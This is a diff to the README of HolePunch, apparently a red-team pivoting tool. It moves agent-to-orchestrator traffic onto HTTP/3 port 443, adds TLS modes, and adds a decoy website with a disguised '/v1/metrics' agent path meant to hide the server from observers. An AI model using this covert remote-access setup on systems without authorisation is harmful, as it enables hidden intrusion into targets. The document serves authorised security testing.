@@ -22,6 +22,22 @@ make test            # go test -race ./...
 
 Requires Go 1.24+. Pre-built binaries: [Releases](https://github.com/abb3rrant/HolePunch/releases).
 
+## How it works
+
+The orchestrator listens on **UDP/443 as an HTTP/3 server**. Agents and operators connect to it over QUIC — the same UDP socket used for orchestration is also used for peer-to-peer hole punching, so the server can record each client's NAT-mapped endpoint and share it with peers for direct tunneling. Once two peers have punched through to each other, all data flows **directly** — the orchestrator is no longer needed.
+
+Because the transport is standard HTTP/3, a decoy website (`-webroot`) can be served on the same port. Regular HTTPS traffic hits the static files; agent connections POST to a configurable path that looks like any other web endpoint.
+
+```
+Agent ──QUIC/HTTP3──► Orchestrator:443 ◄──QUIC/HTTP3── Operator
+         (register, wait for punch coords)
+              │
+              └─── server hands each side the other's UDP endpoint
+              │
+Agent ──raw UDP─────────────────────────────────────── Operator
+         (ChaCha20-Poly1305 encrypted peer tunnel)
+```
+
 ## Quick start
 
 Three roles, two binaries. Operator role is gated by an Ed25519 keypair —
@@ -29,7 +45,7 @@ without a key the client runs as a passive agent, period.
 
 | Role | Binary | Needs |
 |---|---|---|
-| Orchestrator | `holepunch-server` | Public IP, UDP/41234 open inbound, `authorized_keys` file |
+| Orchestrator | `holepunch-server` | Public IP, UDP/443 open inbound, `authorized_keys` file |
 | Agent | `holepunch-client` | Outbound UDP only, no root, **no key** |
 | Operator | `holepunch-client` | Ed25519 private key + sudo (TUN only) |
 
@@ -54,23 +70,26 @@ pubkey per line; `#` for comments).
 
 ```bash
 ./holepunch-server
-# 2026/04/23 22:30:00 HolePunch v1.0.0
-# 2026/04/23 22:30:00 Listening on 0.0.0.0:41234 (max clients: 100)
+# 2026/04/23 22:30:00 Generated self-signed TLS cert — agents must use -ignorecert
+# 2026/04/23 22:30:00 Listening on 0.0.0.0:443 (HTTP/3, max clients: 100)
+# 2026/04/23 22:30:00 Agent path: /v1/metrics
 # 2026/04/23 22:30:00 Loaded 1 operator key(s) from ./authorized_keys
 [HolePunch] >>
 ```
 
-`-authorized-keys <path>` overrides the default `./authorized_keys`. If the
-file is missing or empty the server logs a loud warning and runs with zero
-operators allowed (so every connected client stays an agent).
+The default TLS mode is `self` (auto-generated self-signed cert). See
+[TLS modes](#tls-modes) for Let's Encrypt and bring-your-own-cert options.
 
 **2. Agent (target machine)**
 
 ```bash
-./holepunch-client -server vps.example.com:41234
+./holepunch-client -server vps.example.com:443 -ignorecert
 # Client ID: 8964d3cdd927e4c5
 # Registered with server
 ```
+
+`-ignorecert` is required when the orchestrator uses the default self-signed
+certificate. Omit it when using a real cert (`-tls-mode cert` or `letsencrypt`).
 
 Passive — leave it running. No key means no operator commands in the shell
 and no peer-list visibility; a captured binary can't enumerate the fleet or
@@ -79,8 +98,9 @@ request punches.
 **3. Operator (your box)**
 
 ```bash
-sudo ./holepunch-client -server vps.example.com:41234 -key ~/.holepunch/operator.key
-# Client ID: 8964d3cdd927e4c5
+sudo ./holepunch-client -server vps.example.com:443 -ignorecert \
+     -key ~/.holepunch/operator.key
+# Client ID: a4718a17447cc37b
 # Registered with server
 # Operator authentication granted
 # Agent discovered: 8964d3cd at 162.243.95.178:55279
@@ -90,7 +110,7 @@ Session: 8964d3cd
 
 If `Operator authentication denied` shows instead, the orchestrator either
 isn't running with your pubkey in its `authorized_keys` or the file's empty —
-the agent shell still works but the operator commands are gated off.
+the agent shell still works but operator commands are gated off.
 
 Now pick a mode.
 
@@ -179,6 +199,69 @@ Target sees the agent's IP as source. Use `-sT` (connect scan); `-sS` needs raw 
 [HolePunch] >> quit
 ```
 
+## TLS modes
+
+The orchestrator requires TLS because QUIC mandates it. Three modes:
+
+### `self` (default)
+
+Generates a self-signed ECDSA certificate on every startup. No configuration
+required, but agents must pass `-ignorecert`.
+
+```bash
+./holepunch-server -tls-mode self
+```
+
+### `cert`
+
+Provide your own certificate and key files.
+
+```bash
+./holepunch-server -tls-mode cert \
+    -tls-cert /etc/ssl/certs/server.crt \
+    -tls-key  /etc/ssl/private/server.key
+```
+
+Agents connect normally — no `-ignorecert` needed when the cert is trusted.
+
+### `letsencrypt`
+
+Automatically obtain and renew a certificate from Let's Encrypt via ACME
+TLS-ALPN-01. The orchestrator opens both UDP/443 (HTTP/3) and TCP/443 (for
+ACME challenge completion). Your domain must resolve to the server's public IP.
+
+```bash
+./holepunch-server -tls-mode letsencrypt \
+    -tls-domain orchestrator.example.com \
+    -tls-cache  /var/cache/holepunch-certs
+```
+
+Agents connect without `-ignorecert`.
+
+## Decoy website
+
+Serve static files on the same UDP/443 port to make the server look like a
+normal HTTPS site to passive observers. Any path that isn't the agent path
+returns the webroot content.
+
+```bash
+./holepunch-server -webroot /var/www/html
+```
+
+Browser → `https://orchestrator.example.com/` → sees your decoy HTML.  
+Agent → `https://orchestrator.example.com/v1/metrics` → connects to fleet.
+
+The agent path is configurable with `-agent-path` (default `/v1/metrics`).
+**Both server and clients must use the same value.**
+
+```bash
+# Server
+./holepunch-server -agent-path /api/health
+
+# Agents and operator
+./holepunch-client -server vps.example.com:443 -agent-path /api/health -ignorecert
+```
+
 ## Commands
 
 ### Operator / agent
@@ -217,13 +300,39 @@ version | help | quit
 
 ## Flags
 
-```
-holepunch-server [-bind 0.0.0.0] [-port 41234] [-max-clients 100] [-6]
-                 [-authorized-keys ./authorized_keys] [-version]
+### `holepunch-server`
 
-holepunch-client [-server localhost:41234] [-6] [-version]
-                 [-key <path>]                # run as operator with this Ed25519 private key
-                 [-keygen <path>]             # one-shot: generate operator keypair and exit
+```
+-bind 0.0.0.0              Address to bind (default 0.0.0.0)
+-port 443                  UDP port (default 443)
+-max-clients 100           Maximum connected clients
+-authorized-keys ./authorized_keys
+                           Operator public keys (one base64 Ed25519 pubkey per line)
+
+-tls-mode self|cert|letsencrypt
+                           Certificate mode (default: self)
+-tls-cert <path>           Certificate file  (cert mode)
+-tls-key  <path>           Private key file  (cert mode)
+-tls-domain <domain>       Domain for ACME   (letsencrypt mode)
+-tls-cache ./cert-cache    Cert cache dir    (letsencrypt mode)
+
+-agent-path /v1/metrics    HTTP path agents connect to (must match clients)
+-webroot <path>            Serve this directory as a decoy website (optional)
+
+-version                   Show version and exit
+```
+
+### `holepunch-client`
+
+```
+-server localhost:443      Orchestrator address (host:port)
+-ignorecert                Skip TLS certificate verification
+                           Required when server uses -tls-mode self
+-agent-path /v1/metrics    HTTP path to connect on (must match server)
+-key <path>                Ed25519 operator private key; omit to run as passive agent
+-keygen <path>             Generate Ed25519 keypair at <path> and exit
+-6                         Use IPv6
+-version                   Show version and exit
 ```
 
 ## Limitations
@@ -235,12 +344,11 @@ holepunch-client [-server localhost:41234] [-6] [-version]
 - **IPv4 only** on the data plane (orchestrator coordination supports `-6`).
 - **Agents are unauthenticated.** Anyone who runs the binary can register as an
   agent and show up in operators' peer lists. Operator auth only gates the
-  ability to *use* the fleet, not to *join* it. Add a per-agent allowlist on
-  the orchestrator if you need stronger fleet-membership control.
-- **No orchestrator-identity pinning on clients.** Clients trust whatever
-  orchestrator address they were pointed at. If the orchestrator is MITM'd at
-  the network level, the operator's auth signature is still bound to the
-  attacker's session nonce — but the punch coordination itself can be tampered.
+  ability to *use* the fleet, not to *join* it.
+- **`-ignorecert` agents** trust the server's self-signed certificate. An
+  on-path attacker who intercepts the QUIC handshake could impersonate the
+  orchestrator — use `-tls-mode cert` or `letsencrypt` on production
+  infrastructure where you need orchestrator-identity pinning.
 
 ## License
 
